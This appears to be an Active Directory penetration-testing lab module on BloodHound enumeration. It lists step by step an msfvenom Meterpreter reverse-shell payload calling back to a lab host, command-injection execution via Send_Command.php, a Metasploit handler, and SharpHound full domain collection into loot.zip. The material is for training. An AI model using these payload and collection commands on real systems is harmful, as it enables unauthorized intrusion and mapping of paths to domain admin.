# 🛡️ Module 09: Active Directory Penetration Testing

```bash
# Exercise 05: Active Directory Enumeration with BloodHound
```

### Scenario

Active Directory graph theory analysis using **BloodHound** and **SharpHound** (`SharpHound.ps1`) allows penetration testers to map complex domain trust relationships, group memberships, and administrative access rights across Active Directory environments. By collecting LDAP object properties, ACLs, logged-on user sessions, and local group memberships, BloodHound constructs visual attack graphs to identify shortest paths to **Domain Admin** privilege escalation.

In this exercise, we generate a 64-bit Meterpreter payload (`reverse.exe`) using `msfvenom`, identify an outdated Apache web server (<font color="#ffd700"><b>2.4.58</b></font>) running on port <font color="#38bdf8"><b>192.168.177.16:8080</b></font>, exploit an unauthenticated file upload and command injection vulnerability (`Send_Command.php`), establish a reverse TCP Meterpreter session on **Windows Server 2016**, configure the **Neo4j graph database engine**, upload and execute `SharpHound.ps1` (`Invoke-BloodHound -CollectionMethod All -Domain LPT.com`), extract domain loot (`loot.zip`), and analyze domain administrative trust paths in the BloodHound GUI.

### Objective

The objective of this lab is to help students learn how to:
- Generate a 64-bit Windows Meterpreter payload using <font color="#ffd700"><b>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.177.18 LPORT=9999 -f exe -o reverse.exe</b></font>
- Perform Nmap service version scanning (<font color="#ffd700"><b>nmap -p- -sV 192.168.177.16</b></font>) and identify target Apache web server version (<font color="#ffd700"><b>2.4.58</b></font>)
- Exploit web file upload and command injection vulnerabilities (`Send_Command.php`) to execute `reverse.exe`
- Configure Metasploit payload handler using <font color="#ffd700"><b>use multi/handler</b></font> to catch incoming Meterpreter session
- Initialize and start the **Neo4j** graph database console using <font color="#ffd700"><b>sudo neo4j console</b></font> and set database credentials (<font color="#ff4d4d"><b>neo4j</b></font> / <font color="#ff4d4d"><b>attacker@123</b></font>)
- Launch **BloodHound** GUI desktop client using <font color="#ffd700"><b>sudo bloodhound</b></font>
- Transfer `BloodHound-Legacy-master.zip` to victim C:\ drive via Meterpreter <font color="#ffd700"><b>upload</b></font> command
- Extract collector scripts in PowerShell using <font color="#ffd700"><b>Expand-Archive -Path "C:\BloodHound-Legacy-master.zip" -DestinationPath "C:\BloodHound" -Force</b></font>
- Load SharpHound collector module using <font color="#ffd700"><b>Import-Module .\SharpHound.ps1</b></font>
- Execute full domain data gathering via <font color="#ffd700"><b>Invoke-BloodHound -CollectionMethod All -Domain LPT.com -ZipFileName loot.zip</b></font>
- Download harvested domain loot (`loot.zip`), import archive into BloodHound dashboard, and query **"Find all Domain Admins"** attack paths
